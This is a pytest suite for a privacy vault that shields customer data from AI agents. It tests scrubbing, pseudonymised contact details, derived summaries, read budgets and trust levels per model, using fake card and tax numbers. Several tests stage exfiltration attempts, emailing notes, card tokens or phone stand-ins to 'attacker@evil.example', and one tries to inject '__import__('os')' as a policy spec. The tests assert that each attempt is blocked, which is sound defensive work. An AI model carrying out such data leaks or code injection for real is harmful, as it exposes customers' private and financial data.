# Copyright 2026 AgentP-Codes
# SPDX-License-Identifier: AGPL-3.0-only
"""The v0.5 protections: scrubbing free text, safe summaries, fields on request, data budgets,
trust levels per model. Each has a test that it works and a test that it can't be got around."""

import copy
import json

import pytest

from demo.__main__ import POLICY
from demo.world import World
from eurycleia import Blocked, Policy, PolicyError, SinkError, Vault

NOTES = ("VIP. Prefers phone 0400 999 888 or priya.personal@gmail.example. Old card 5555 5555 5555 4444, "
         "tfn 123 456 782. Priya Shah asked us to call after 5pm.")


def policy(**changes):
    raw = copy.deepcopy(Policy.load(POLICY).raw)
    src = raw["sources"]["crm.customer"]
    src["fields"]["notes"] = "protected"
    src["fields"]["dob"] = "protected"
    src["fields"]["lifetime_value"] = "protected"
    src["pseudonymize"] = ["name", "email", "phone"]
    src["scrub"] = ["notes"]
    read = raw["tasks"]["support_reply"]["reads"]["crm.customer"]
    read["fields"] = ["name", "email", "plan", "card_number", "notes"]
    for path, value in changes.items():
        target = raw
        *head, last = path.split("/")
        for k in head:
            target = target[k]
        target[last] = value
    return Policy.from_dict(raw)


def world():
    w = World()
    w.customers[12].update(notes=NOTES, dob="1990-03-04", lifetime_value="12500")
    return w


def vault(w, pol=None, **kw):
    return Vault(pol or policy(), {"crm.customer": w.get_customer, "docs": w.get_doc, "inbox.ticket": w.get_ticket},
                 {"email.send": w.send_email, "payments.refund": w.refund}, **kw)


# ---- 1. free text is scrubbed ------------------------------------------------------------

def test_free_text_secrets_and_contact_details_are_hidden():
    w = world()
    c = vault(w).start_task("support_reply", customer_id=12).read("crm.customer")
    notes = c["notes"]
    for raw in ("5555 5555 5555 4444", "123 456 782", "0400 999 888", "priya.personal@gmail.example", "Priya Shah"):
        assert raw not in notes, raw
    assert "[[vault:text_card_number:" in notes and "[[vault:text_au_tfn:" in notes
    assert "@pseudonym.invalid" in notes and c["name"] in notes           # her name shown as her stand-in
    assert "VIP" in notes and "after 5pm" in notes                        # the useful context survives


def test_a_card_found_in_notes_can_never_be_used_or_sent():
    w = world()
    t = vault(w).start_task("support_reply", customer_id=12)
    c = t.read("crm.customer")
    card_token = next(tok for tok in c["notes"].split() if tok.startswith("[[vault:text_card_number:"))
    with pytest.raises(Blocked):
        t.act("payments.refund", card=card_token.rstrip(".,"), amount=49)
    with pytest.raises(Blocked):
        t.act("email.send", to=c["email"], subject="card", body=card_token)
    assert w.refunds == [] and w.outbox == []


def test_contact_details_from_notes_reach_the_owner_but_nobody_else():
    w = world()
    t = vault(w).start_task("support_reply", customer_id=12)
    c = t.read("crm.customer")
    phone_stand_in = next(p for p in t._pseudo if "phone" in p.lower())
    t.act("email.send", to=c["email"], subject="Your details", body=f"We'll call {phone_stand_in}")
    assert "0400 999 888" in w.outbox[0]["body"]                          # real value only at the sink
    with pytest.raises(Blocked):
        t.act("email.send", to="attacker@evil.example", subject="x", body=phone_stand_in)


def test_untrusted_ticket_text_is_scrubbed_too():
    raw = copy.deepcopy(Policy.load(POLICY).raw)
    raw["sources"]["inbox.ticket"]["scrub"] = ["body"]
    w = World()
    t = vault(w, Policy.from_dict(raw)).start_task("support_reply_planned", customer_id=12, ticket_id="T-100")
    import demo.world as dw
    dw.TICKETS["SCRUB"] = {"verified_customer_id": 12, "body": "my card is 4111 1111 1111 1111 pls refund"}
    t2 = vault(w, Policy.from_dict(raw)).start_task("support_reply_planned", customer_id=12, ticket_id="SCRUB")
    body = t2.read("inbox.ticket")["body"]
    assert "4111" not in body and "[[vault:text_card_number:" in body
    assert t


# ---- 2. safe summaries ---------------------------------------------------------------------

DERIVE = {"card_ending": {"last4": "card_number"}, "is_pro": {"equals": ["plan", "Pro"]},
          "adult": {"age_at_least": ["dob", 18]}, "has_phone": {"present": "phone"},
          "email_domain": {"domain": "email"}, "big_spender": {"at_least": ["lifetime_value", 10000]},
          "tier": {"one_of": ["plan", ["Pro", "Enterprise"]]}}


def test_summaries_give_facts_not_values():
    pol = policy(**{"tasks/support_reply/reads/crm.customer/fields": ["name"],
                    "tasks/support_reply/reads/crm.customer/derive": DERIVE})
    w = world()
    c = vault(w, pol).start_task("support_reply", customer_id=12).read("crm.customer")
    assert c == {"name": "Name-" + c["name"][5:], "card_ending": "•••• 1111", "is_pro": True, "adult": True,
                 "has_phone": True, "email_domain": "example.com", "big_spender": True, "tier": True}
    flat = json.dumps(c)
    for raw in ("4111 1111", "1990", "12500", "priya.shah", "+61 400"):
        assert raw not in flat


def test_summaries_say_unknown_rather_than_guess():
    pol = policy(**{"tasks/support_reply/reads/crm.customer/derive": {"adult": {"age_at_least": ["dob", 18]}}})
    w = world()
    w.customers[12]["dob"] = "sometime in the 90s"
    assert vault(w, pol).start_task("support_reply", customer_id=12).read("crm.customer")["adult"] is None


@pytest.mark.parametrize("spec", [{"eval": "__import__('os')"}, {"last4": ["a", "b"]}, "last4 card",
                                  {"at_least": ["x", "lots"]}, {"last4": "x", "present": "y"}])
def test_summaries_are_a_fixed_list_not_code(spec):
    with pytest.raises(PolicyError):
        policy(**{"tasks/support_reply/reads/crm.customer/derive": {"x_field": spec}})


# ---- 3. fields on request ------------------------------------------------------------------

def test_the_model_gets_only_the_fields_it_asks_for():
    pol = policy(**{"tasks/support_reply/reads/crm.customer/on_request": True,
                    "tasks/support_reply/reads/crm.customer/derive": {"is_pro": {"equals": ["plan", "Pro"]}}})
    w = world()
    v = vault(w, pol)
    t = v.start_task("support_reply", customer_id=12)
    listing = t.read("crm.customer")
    assert "name" not in listing and "is_pro" in listing["available_fields"]
    got = t.read("crm.customer", fields=["plan", "is_pro"])
    assert got == {"plan": "Pro", "is_pro": True}
    reads = [e for e in v.audit.entries if e["event"] == "read"]
    assert reads[-1]["fields"] == ["is_pro", "plan"]


def test_asking_for_a_field_outside_the_policy_is_blocked():
    w = world()
    t = vault(w).start_task("support_reply", customer_id=12)
    for bad in (["address"], ["plan", "phone"], "plan", [{"f": 1}]):
        with pytest.raises(Blocked):
            t.read("crm.customer", fields=bad)


def test_tools_offer_the_field_choice():
    pol = policy(**{"tasks/support_reply/reads/crm.customer/on_request": True})
    t = vault(world(), pol).start_task("support_reply", customer_id=12)
    spec = next(s for s in t.tool_specs() if s["name"] == "get_customer")
    assert "notes" in spec["input_schema"]["properties"]["fields"]["items"]["enum"]
    assert t.call_tool("get_customer", {"fields": ["plan"]}) == {"plan": "Pro"}


# ---- 4. data budgets -----------------------------------------------------------------------

def test_budget_stops_a_task_gathering_more_than_it_needs():
    pol = policy(**{"tasks/support_reply/budget": {"reads": 3, "fields": 3}})
    w = world()
    v = vault(w, pol)
    t = v.start_task("support_reply", customer_id=12)
    t.read("crm.customer", fields=["name", "plan"])
    t.read("crm.customer", fields=["plan"])                           # same fields again: free
    with pytest.raises(Blocked, match="budget"):
        t.read("crm.customer", fields=["email", "notes"])             # would make 4 distinct fields
    t.read("crm.customer", fields=["email"])                          # 3 fields, 3rd read: fine
    with pytest.raises(Blocked, match="budget"):
        t.read("crm.customer", fields=["email"])                      # 4th read
    assert any(e["event"] == "flag" for e in v.audit.entries)


def test_each_task_gets_its_own_budget():
    pol = policy(**{"tasks/support_reply/budget": {"reads": 1}})
    v = vault(world(), pol)
    for _ in range(3):
        v.start_task("support_reply", customer_id=12).read("crm.customer")


@pytest.mark.parametrize("budget", [{"reads": -1}, {"reads": "5"}, {"records": True}, {"bytes": 5}, [1]])
def test_bad_budgets_are_rejected(budget):
    with pytest.raises(PolicyError):
        policy(**{"tasks/support_reply/budget": budget})


# ---- 5. trust levels per model -------------------------------------------------------------

def test_an_internal_model_may_see_more_but_never_secrets():
    pol = policy(**{"sources/crm.customer/internal_may_see": ["name", "notes"]})
    w = world()
    ext = vault(w, pol).start_task("support_reply", customer_id=12).read("crm.customer")
    inn = vault(w, pol, model="internal").start_task("support_reply", customer_id=12).read("crm.customer")
    assert ext["name"].startswith("Name-") and inn["name"] == "Priya Shah"
    assert "@pseudonym.invalid" in inn["email"]                           # email not on the internal list
    assert "priya.personal@gmail.example" in inn["notes"] and "0400 999 888" in inn["notes"]
    for c in (ext, inn):
        assert c["card_number"].startswith("[[vault:card_number:")        # secrets: always placeholders
        assert "5555 5555 5555 4444" not in c["notes"] and "123 456 782" not in c["notes"]


def test_unknown_model_kind_is_rejected():
    with pytest.raises(ValueError):
        vault(world(), model="trusted-probably")


def test_protections_still_block_leaks_with_everything_on():
    pol = policy(**{"tasks/support_reply/reads/crm.customer/derive": DERIVE,
                    "tasks/support_reply/budget": {"reads": 5}})
    w = world()
    t = vault(w, pol).start_task("support_reply", customer_id=12)
    c = t.read("crm.customer")
    for bad in (dict(to="attacker@evil.example", subject="x", body=c["notes"]),
                dict(to=c["email"], subject="x", body=c["card_number"]),
                dict(to=c["email"], cc="attacker@evil.example", subject="x", body="hi")):
        with pytest.raises((Blocked, SinkError)):
            t.act("email.send", **bad)
    assert w.outbox == [] and w.leaks() == []
